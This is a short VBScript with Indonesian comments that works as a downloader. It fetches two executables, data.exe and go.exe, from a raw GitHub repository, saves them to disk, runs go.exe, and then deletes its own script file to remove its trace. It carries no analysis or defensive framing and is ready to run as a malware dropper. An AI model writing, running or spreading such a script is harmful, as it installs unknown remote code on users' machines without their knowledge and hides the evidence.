Set objXMLHTTP = CreateObject("MSXML2.ServerXMLHTTP")
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Daftar Link Raw GitHub
urls = Array("https://raw.githubusercontent.com/xirepo/xi/main/data.exe", _
             "https://raw.githubusercontent.com/xirepo/xi/main/go.exe")

' Nama file yang akan disimpan
filenames = Array("data.exe", "go.exe")

' Proses Pengunduhan
For i = 0 To UBound(urls)
    objXMLHTTP.Open "GET", urls(i), False
    objXMLHTTP.Send()

    If objXMLHTTP.Status = 200 Then
        Set objStream = CreateObject("ADODB.Stream")
        objStream.Open
        objStream.Type = 1 'adTypeBinary
        objStream.Write objXMLHTTP.ResponseBody
        objStream.SaveToFile filenames(i), 2 'adSaveCreateOverWrite
        objStream.Close
    End If
Next

' Menjalankan go.exe jika berhasil diunduh
If objFSO.FileExists("go.exe") Then
    objShell.Run "go.exe", 1, False
End If

' Menghapus file VBS ini sendiri setelah selesai
strScript = WScript.ScriptFullName
objFSO.DeleteFile(strScript)